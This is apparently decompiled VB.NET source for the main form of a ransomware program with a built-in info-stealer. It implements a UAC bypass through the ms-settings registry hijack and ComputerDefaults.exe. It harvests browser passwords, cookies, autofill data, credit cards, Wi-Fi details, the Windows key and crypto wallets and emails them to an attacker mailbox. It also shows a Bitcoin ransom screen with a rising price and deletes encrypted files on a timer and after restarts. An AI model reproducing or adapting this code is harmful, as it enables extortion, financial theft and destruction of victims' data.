Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Linq
Imports System.Net
Imports System.Net.Mail
Imports System.Reflection
Imports System.Runtime.CompilerServices
Imports System.Security.Principal
Imports System.Windows.Forms
Imports Main.Properties
Imports Main.Tools
Imports Microsoft.Win32
Imports SkinSoft.VisualStyler
Imports SkinSoft.VisualStyler.Licensing

Namespace Main
	' Token: 0x02000009 RID: 9
	Public NotInheritable Partial Class FormGame
		Inherits Form

		' Token: 0x0600001B RID: 27 RVA: 0x000036E4 File Offset: 0x000018E4
		Private Shared Sub ResetRunFlag()
			Try
				File.Delete(Path.Combine(Config.WorkFolderPath, "dr"))
				File.Delete(Config.WorkFolderPath + "Address.txt")
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600001C RID: 28 RVA: 0x00003730 File Offset: 0x00001930
		Public Shared Function GetAccountType() As String
			Using current As WindowsIdentity = WindowsIdentity.GetCurrent()
				Dim windowsPrincipal As WindowsPrincipal = New WindowsPrincipal(current)
				If windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator) Then
					Return "Admin"
				End If
				If windowsPrincipal.IsInRole(WindowsBuiltInRole.User) Then
					Return "User"
				End If
				If windowsPrincipal.IsInRole(WindowsBuiltInRole.Guest) Then
					Return "Guest"
				End If
			End Using
			Return "Unknown"
		End Function

		' Token: 0x0600001D RID: 29 RVA: 0x000037AC File Offset: 0x000019AC
		Public Shared Function IsElevated() As Boolean
			Dim flag As Boolean
			Using current As WindowsIdentity = WindowsIdentity.GetCurrent()
				Dim windowsPrincipal As WindowsPrincipal = New WindowsPrincipal(current)
				flag = windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator)
			End Using
			Return flag
		End Function

		' Token: 0x0600001E RID: 30 RVA: 0x000037F0 File Offset: 0x000019F0
		Public Shared Sub ElevateMe()
			Dim empty As String = String.Empty
			Dim entryAssembly As Assembly = Assembly.GetEntryAssembly()
			FormGame.smethod_0(empty, If((entryAssembly IsNot Nothing), entryAssembly.Location, Nothing))
			FormGame.smethod_0("DelegateExecute", String.Empty)
			New Process() With { .StartInfo = New ProcessStartInfo() With { .WindowStyle = ProcessWindowStyle.Hidden, .FileName = "C:\Windows\System32\ComputerDefaults.exe" } }.Start()
			Environment.[Exit](0)
		End Sub

		' Token: 0x0600001F RID: 31 RVA: 0x00003858 File Offset: 0x00001A58
		Public Shared Sub SendPasswordEmail()
			Try
				Dim location As Geolocation = Geolocation.GetLocation()
				Dim mailMessage As MailMessage = New MailMessage()
				Dim processes As Process() = Process.GetProcesses()
				For Each process As Process In processes
					FormGame._listedProcesses = FormGame._listedProcesses + process.ProcessName + " / " + process.MainWindowTitle
					FormGame._listedProcesses += Environment.NewLine
				Next
				Dim now As DateTime = DateTime.Now
				Dim winSerial As WinSerial = New WinSerial()
				Dim recovery As Recovery = New Recovery()
				recovery.recoverAll()
				Dim smtpClient As SmtpClient = New SmtpClient(Config.SmtpServerData.ServerLinkAddress)
				mailMessage.From = New MailAddress(Config.SmtpServerData.SelectedMailFrom)
				mailMessage.[To].Add(Config.SmtpServerData.SelectedMailTo)
				mailMessage.Subject = "Victim's Info and Password Dump!"
				Dim text As String = String.Empty
				Dim text2 As String = String.Empty
				Dim text3 As String = String.Empty
				Dim text4 As String = String.Empty
				For Each passData As PassData In Browsers.GetPasswords()
					text += passData
				Next
				For Each formData As FormData In Browsers.GetForms()
					text2 += formData
				Next
				For Each cardData As CardData In Browsers.GetCards()
					text3 += cardData
				Next
				For Each cookieData As CookieData In Browsers.GetCookies()
					text4 += cookieData
				Next
				mailMessage.Body = String.Concat(New Object() { vbLf & vbLf & "User Name: ", Environment.UserName, vbLf & vbLf & "Machine Name: ", Environment.MachineName, vbLf & vbLf & "Public IP Address: ", UtilitiesProcess.GetIpAddress(), vbLf & vbLf & "OS Version: ", Environment.OSVersion, vbLf & vbLf & "Microsoft Windows Serial Number: ", winSerial.GetWindowsProductKeyFromRegistry(), vbLf & vbLf & "Number of Processors: ", Environment.ProcessorCount, vbLf & vbLf & "Country: ", location.Country, vbLf & vbLf & "City: ", location.City, vbLf & vbLf & "Local Date/Time: ", now, vbLf & vbLf & "Running Processes:" & vbLf & vbLf, FormGame._listedProcesses, vbLf & vbLf & "User Passwords #1:" & vbLf & vbLf, Recovery.allPws, vbLf & vbLf & "User Passwords #2:" & vbLf & vbLf, text, vbLf & vbLf & "Cookies:" & vbLf & vbLf, text4, vbLf & vbLf & "Browser AutoFill Data:" & vbLf & vbLf, text2, vbLf & vbLf & "Credit Cards Data:" & vbLf & vbLf, text3, vbLf & vbLf & "Wifi Information:" & vbLf & vbLf, UtilitiesProcess.WifiInfos() })
				Crypto.Steal(FormGame.cryptoDir)
				For Each text5 As String In Directory.GetFiles(FormGame.cryptoDir, "*.*", SearchOption.AllDirectories)
					Dim attachment As Attachment = New Attachment(text5) With { .Name = text5 }
					mailMessage.Attachments.Add(attachment)
				Next
				smtpClient.Port = Config.SmtpServerData.ServerPort
				smtpClient.Credentials = New NetworkCredential(Config.SmtpServerData.SelectedUsername, Config.SmtpServerData.SelectedPassword)
				smtpClient.EnableSsl = Config.SmtpServerData.SslEnable
				smtpClient.Send(mailMessage)
				Directory.Delete(FormGame.dir, True)
			Catch
			End Try
		End Sub

		' Token: 0x06000020 RID: 32 RVA: 0x00003C68 File Offset: 0x00001E68
		Public Shared Sub GetPasswords()
			Try
				Dim processStartInfo As ProcessStartInfo = New ProcessStartInfo(FormGame.ExeToRun) With { .WindowStyle = ProcessWindowStyle.Hidden, .RedirectStandardInput = True, .RedirectStandardOutput = False, .Arguments = "-f " + FormGame.ExeToRun.Replace(".exe", ".txt"), .UseShellExecute = False, .CreateNoWindow = True }
				Dim process As Process = New Process() With { .StartInfo = processStartInfo }
				process.Start()
				process.WaitForExit()
				File.SetAttributes(FormGame.ExeToRun.Replace(".exe", ".txt"), File.GetAttributes(FormGame.ExeToRun) Or FileAttributes.Hidden Or FileAttributes.System)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000021 RID: 33 RVA: 0x0000231F File Offset: 0x0000051F
		Public Shared Sub SetWallpaper()
			Wallpaper.[Set](New Uri(Config.WallPaperImageLink + Config.WallPaperImageFileName), Wallpaper.Style.Fill)
		End Sub

		' Token: 0x06000022 RID: 34 RVA: 0x0000233B File Offset: 0x0000053B
		Public Sub New()
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000023 RID: 35 RVA: 0x00003D20 File Offset: 0x00001F20
		Private Sub FormGame_Load(sender As Object, e As EventArgs)
			MyBase.ShowIcon = True
			MyBase.MaximizeBox = False
			MyBase.MinimizeBox = False
			MyBase.ControlBox = True
			MyBase.FormBorderStyle = FormBorderStyle.Sizable
			MyBase.ShowInTaskbar = False
			MyBase.StartPosition = FormStartPosition.CenterScreen
			Me.timerTypingEffect.Interval = 125
			Me.timerTypingEffect.Enabled = False
			Me.labelWelcome.Text = ""
			Me.timerTypingEffect.Interval = 10
			Me.timerCountDown.Interval = 100
			Me.labelTask.Text = Config.TaskMessage
			Me.labelTask.Visible = True
			Me.textBoxAddress.[ReadOnly] = True
			Me.textBoxAddress.Visible = True
			Me.buttonCheckPayment.Visible = True
			Me.buttonViewEncryptedFiles.Visible = True
			Me.labelCountDown.Visible = True
			Me.timerCountDown.Enabled = True
			Me.labelFilesToDelete.Visible = True
			Me.label1.Visible = True
			Dim control As Control = Me.textBoxAddress
			Dim newBtcAddress As String = BlockIo.GetNewBtcAddress()
			FormGame.UniqueBtcAddress = newBtcAddress
			control.Text = newBtcAddress
			FormGame.BaseHourlyRise = Config.IncreaseRansomEveryHour
			Try
				Me.label1.Text = "1 BTC = " + BlockIo.GetPrice().ToString("F") + " USD"
				FormGame._baseBalanceBtc = BlockIo.GetBalanceBtc(FormGame.UniqueBtcAddress)
			Catch
			End Try
			Dim mainModule As ProcessModule = Process.GetCurrentProcess().MainModule
			If Config.DeleteManyFilesPunishementIfRestarted AndAlso FormGame.DidRun() AndAlso (mainModule.FileName.Contains(Config.TempExeRelativePath) OrElse mainModule.FileName.Contains(Config.FinalExeRelativePath)) Then
				FormGame.DeleteFiles(Config.HowManyFilesToDeleteEachRestart)
			End If
		End Sub

		' Token: 0x06000024 RID: 36 RVA: 0x00003EDC File Offset: 0x000020DC
		Public Shared Function DidRun() As Boolean
			Dim text As String = Path.Combine(Config.WorkFolderPath, "dr")
			Dim flag As Boolean
			If File.Exists(text) Then
				flag = True
			Else
				File.WriteAllText(text, "21")
				flag = False
			End If
			Return flag
		End Function

		' Token: 0x06000025 RID: 37 RVA: 0x00003F14 File Offset: 0x00002114
		Private Shared Sub DeleteFiles(num As Integer)
			Try
				Dim num2 As Integer = 0
				For Each text As String In Locker.GetEncryptedFiles()
					If num2 = num Then
						Exit For
					End If
					File.Delete(text + ".die")
					num2 += 1
				Next
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000026 RID: 38 RVA: 0x00003F90 File Offset: 0x00002190
		Public Shared Function GetBitcoinAddess() As String
			Dim text As String = Path.Combine(Config.WorkFolderPath, "Address.txt")
			Dim text2 As String
			If File.Exists(text) Then
				text2 = File.ReadAllText(text)
			Else
				Dim hashSet As HashSet(Of String) = New HashSet(Of String)()
				For Each text3 As String In Resources.vanityAddresses.Split(New String() { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries).ToList()
					hashSet.Add(text3.Trim())
				Next
				Dim enumerable As IEnumerable(Of String) = hashSet
				Dim <>9__24_ As Func(Of String, Guid) = FormGame.<>c.<>9__24_0
				Dim func As Func(Of String, Guid) = <>9__24_
				If <>9__24_ Is Nothing Then
					Dim func2 As Func(Of String, Guid) = Function(x As String) Guid.NewGuid()
					func = func2
					FormGame.<>c.<>9__24_0 = func2
				End If
				Dim text4 As String = enumerable.OrderBy(func).FirstOrDefault()
				File.WriteAllText(text, text4)
				text2 = text4
			End If
			Return text2
		End Function

		' Token: 0x17000005 RID: 5
		' (get) Token: 0x06000027 RID: 39 RVA: 0x00004068 File Offset: 0x00002268
		Protected Overrides ReadOnly Property CreateParams As CreateParams
			Get
				Dim createParams As CreateParams = MyBase.CreateParams
				createParams.ClassStyle = createParams.ClassStyle Or 512
				Return createParams
			End Get
		End Property

		' Token: 0x06000028 RID: 40 RVA: 0x00002350 File Offset: 0x00000550
		Private Sub FormGame_FormClosing(sender As Object, e As FormClosingEventArgs)
			e.Cancel = True
			MessageBox.Show(Me, "You are about to make a very bad decision. Are you sure about it?")
		End Sub

		' Token: 0x06000029 RID: 41 RVA: 0x00004094 File Offset: 0x00002294
		Private Sub timerTypingEffect_Tick(sender As Object, e As EventArgs)
			Dim welcomeMessage As String = Config.WelcomeMessage
			Me.labelWelcome.Text = welcomeMessage.Substring(0, FormGame._indexNum) + "_"
			FormGame._indexNum += 1
			If FormGame._indexNum = welcomeMessage.Length + 1 Then
				Me.timerTypingEffect.Enabled = False
				Me.labelTask.Visible = True
				Me.textBoxAddress.Visible = True
				Me.buttonCheckPayment.Visible = True
				Me.buttonViewEncryptedFiles.Visible = True
				Me.labelCountDown.Visible = True
				Me.timerCountDown.Enabled = True
				Me.labelFilesToDelete.Visible = True
				Me.buttonCopy.Visible = True
				Me.linkLabel1.Visible = True
				Me.linkLabel2.Visible = True
				Try
					Me.label1.Text = "1 BTC = " + BlockIo.GetPrice().ToString("F") + " USD"
				Catch
				End Try
				Me.label1.Visible = True
				FormGame._timeLeftSec = 60
			End If
		End Sub

		' Token: 0x0600002A RID: 42 RVA: 0x000041C4 File Offset: 0x000023C4
		Private Sub buttonCheckPayment_Click(sender As Object, e As EventArgs)
			Try
				Dim price As Double = BlockIo.GetPrice()
				Dim balanceBtc As Double = BlockIo.GetBalanceBtc(FormGame.UniqueBtcAddress)
				Dim num As Integer = CInt((balanceBtc * price))
				If CDbl(num) - FormGame._baseBalanceBtc >= CDbl(Config.RansomUsd) Then
					Me.timerCountDown.[Stop]()
					Me.buttonCheckPayment.Enabled = False
					Me.buttonCheckPayment.BackColor = Color.Lime
					Me.buttonCheckPayment.Text = "Good job, I'm decrypting your files..."
					MessageBox.Show(Me, "Decrypting your files. It will take some time. After its done I will close and completely remove myself from your computer.", "Good job")
					Locker.DecryptFiles(".die")
					FormGame.ResetRunFlag()
					UtilitiesProcess.ProcessIsCritical(False)
					UtilitiesProcess.SetTaskManager(True)
					UtilitiesProcess.DisableWindowsUpdate(False)
					UtilitiesProcess.deleteService("wuaserv")
					UtilitiesProcess.enableCMD()
					UtilitiesProcess.enableRegedit()
					MutexHelper.CloseMutex()
					Hacking.RemoveItself()
				ElseIf CDbl(num) - FormGame._baseBalanceBtc > 0.0 Then
					Me.buttonCheckPayment.Text = "You did not send enough money! Try again!"
				Else
					Me.buttonCheckPayment.Text = "You haven't made any payment yet! Try again!"
				End If
			Catch ex As Exception
				Me.buttonCheckPayment.Text = "Are you connected to the internet? Try again!"
			End Try
		End Sub

		' Token: 0x0600002B RID: 43 RVA: 0x000042F0 File Offset: 0x000024F0
		Private Sub buttonViewEncryptedFiles_Click(sender As Object, e As EventArgs)
			Dim formEncryptedFiles As FormEncryptedFiles = New FormEncryptedFiles()
			formEncryptedFiles.Show(Me)
		End Sub

		' Token: 0x0600002C RID: 44 RVA: 0x0000430C File Offset: 0x0000250C
		Private Sub timerCountDown_Tick(sender As Object, e As EventArgs)
			If FormGame._timeLeftSec > 0 Then
				FormGame._timeLeftSec -= 1
				Dim num As Integer = FormGame._timeLeftSec / 60
				Dim num2 As Integer = FormGame._timeLeftSec Mod 60
				Me.labelCountDown.Text = num + ":" + num2
			Else
				FormGame._timeLeftSec = 60
				Dim num3 As Integer = CInt(Math.Pow(1.1, CDbl(FormGame._exponent)))
				Dim num4 As Integer = FormGame.BaseHourlyRise - 1
				FormGame.BaseHourlyRise = num4
				If num4 <= 0 AndAlso Config.RiseRansom Then
					If Config.MaxRansomUsd > Config.RansomUsd + Config.RansomUsd * Config.IncreaseRansomByPercent / 100 Then
						Config.RansomUsd += Config.RansomUsd * Config.IncreaseRansomByPercent / 100
						Me.labelTask.Text = "Send $" + Config.RansomUsd + " worth in Bitcoin here:"
						FormGame.BaseHourlyRise = Config.IncreaseRansomEveryHour
					Else
						Me.labelTask.Text = "Send $" + Config.RansomUsd + " worth in Bitcoin here:"
						FormGame.BaseHourlyRise = Config.IncreaseRansomEveryHour
					End If
				End If
				If num3 < 0 Then
					num3 = Integer.MaxValue
				End If
				Me.labelFilesToDelete.Text = num3 + " files will be deleted..."
				FormGame._exponent += 1
				FormGame.DeleteFiles(num3)
			End If
		End Sub

		' Token: 0x0600002D RID: 45 RVA: 0x00004470 File Offset: 0x00002670
		Private Sub FormGame_KeyDown(sender As Object, e As KeyEventArgs)
			If e.Control AndAlso e.Shift AndAlso e.KeyCode = Keys.R Then
				Try
					Me.timerCountDown.[Stop]()
					Me.buttonCheckPayment.Enabled = False
					Me.buttonCheckPayment.BackColor = Color.Lime
					Me.buttonCheckPayment.Text = "Good job, I'm decrypting your files..."
					MessageBox.Show(Me, "Decrypting your files. It will take some time. After its done I will close and completely remove myself from your computer.", "Good job")
					Locker.DecryptFiles(".die")
					FormGame.ResetRunFlag()
					UtilitiesProcess.ProcessIsCritical(False)
					UtilitiesProcess.SetTaskManager(True)
					UtilitiesProcess.DisableWindowsUpdate(False)
					UtilitiesProcess.deleteService("wuaserv")
					UtilitiesProcess.enableCMD()
					UtilitiesProcess.enableRegedit()
					MutexHelper.CloseMutex()
					Hacking.RemoveItself()
				Catch
					Me.buttonCheckPayment.Text = "Are you connected to the internet? Try again!"
				End Try
			End If
		End Sub

		' Token: 0x0600002E RID: 46 RVA: 0x00002365 File Offset: 0x00000565
		Private Sub FormGame_MouseDown(sender As Object, e As MouseEventArgs)
			Me._lastPoint = New Point(e.X, e.Y)
		End Sub

		' Token: 0x0600002F RID: 47 RVA: 0x0000454C File Offset: 0x0000274C
		Private Sub FormGame_MouseMove(sender As Object, e As MouseEventArgs)
			If e.Button = MouseButtons.Left Then
				MyBase.Left += e.X - Me._lastPoint.X
				MyBase.Top += e.Y - Me._lastPoint.Y
			End If
		End Sub

		' Token: 0x06000030 RID: 48 RVA: 0x0000237E File Offset: 0x0000057E
		Private Sub button1_Click(sender As Object, e As EventArgs)
			Clipboard.SetDataObject(Me.textBoxAddress.Text)
			Me.timer1.Interval = 250
			Me.timer1.Enabled = True
		End Sub

		' Token: 0x06000031 RID: 49 RVA: 0x000045A8 File Offset: 0x000027A8
		Private Sub timer1_Tick(sender As Object, e As EventArgs)
			Dim flag As Integer = FormGame._flag
			FormGame._flag = flag - 1
			If flag <> 0 Then
				Me.buttonCopy.Enabled = False
				Me.buttonCopy.Text = "Copied " + FormGame._flag + " sec"
			Else
				FormGame._flag = 3
				Me.timer1.Enabled = False
				Me.buttonCopy.Text = "Copy to Clipboard"
				Me.buttonCopy.Enabled = True
			End If
		End Sub

		' Token: 0x06000032 RID: 50 RVA: 0x000023AC File Offset: 0x000005AC
		Private Sub linkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs)
			Process.Start("https://www.coinbase.com/")
		End Sub

		' Token: 0x06000033 RID: 51 RVA: 0x000023B9 File Offset: 0x000005B9
		Private Sub linkLabel2_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs)
			Process.Start("https://support.coinbase.com/customer/en/portal/articles/1823285-what-is-bitcoin-")
		End Sub

		' Token: 0x06000034 RID: 52 RVA: 0x00004628 File Offset: 0x00002828
		Private Sub timer2_Tick(sender As Object, e As EventArgs)
			Try
				Me.label1.Text = "1 BTC = " + BlockIo.GetPrice().ToString("F") + " USD"
			Catch
			End Try
		End Sub

		' Token: 0x06000038 RID: 56 RVA: 0x00005544 File Offset: 0x00003744
		<CompilerGenerated()>
		Friend Shared Sub smethod_0(name As String, val As String)
			Dim registryKey As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Classes\ms-settings\shell\open\command")
			If registryKey IsNot Nothing Then
				registryKey.SetValue(name, val)
				registryKey.Close()
			End If
		End Sub

		' Token: 0x04000057 RID: 87
		Private Shared _timeLeftSec As Integer

		' Token: 0x04000058 RID: 88
		Private Shared _exponent As Integer

		' Token: 0x04000059 RID: 89
		Private Const Base As Double = 1.1

		' Token: 0x0400005A RID: 90
		Private Shared _flag As Integer = 3

		' Token: 0x0400005B RID: 91
		Private Shared ExeToRun As String = Path.GetTempPath() + Guid.NewGuid() + ".exe"

		' Token: 0x0400005C RID: 92
		Private Shared _listedProcesses As String = String.Empty

		' Token: 0x0400005D RID: 93
		Private Shared _baseBalanceBtc As Double

		' Token: 0x0400005E RID: 94
		Private Shared UniqueBtcAddress As String = String.Empty

		' Token: 0x0400005F RID: 95
		Private Shared BaseHourlyRise As Integer

		' Token: 0x04000060 RID: 96
		Private Shared dir As String = Environment.GetEnvironmentVariable("temp") + "\" + Helper.GetHwid()

		' Token: 0x04000061 RID: 97
		Private Shared workDir As String = FormGame.dir + "\Directory"

		' Token: 0x04000062 RID: 98
		Private Shared cryptoDir As String = FormGame.workDir + "\Wallets"

		' Token: 0x04000063 RID: 99
		Private Shared _indexNum As Integer

		' Token: 0x04000064 RID: 100
		Private _lastPoint As Point
	End Class
End Namespace
